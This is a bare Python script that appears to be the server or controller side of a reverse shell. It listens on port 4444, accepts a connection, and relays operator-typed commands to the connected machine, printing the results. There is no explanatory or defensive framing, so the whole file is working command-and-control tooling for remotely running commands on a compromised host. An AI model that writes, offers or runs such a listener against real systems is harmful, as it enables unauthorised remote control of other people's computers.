import socket
import sys

#Creating sockets
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=4444
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error"+str(msg))

#Binding sockets
def bind_socket():
    try:    
        global host
        global port
        global s
        
        print("Binding with port: "+str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding failure"+str(msg)+'\n'+"Retrying......")
        bind_socket()

#Establish connection

def socket_accept():
    conn, address = s.accept()
    print("Connection Established "+"IP: "+address[0]+" Port: "+str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:         #Infinite loop
        cmd = input()
        if cmd =='quit':
            conn.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end = "")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()


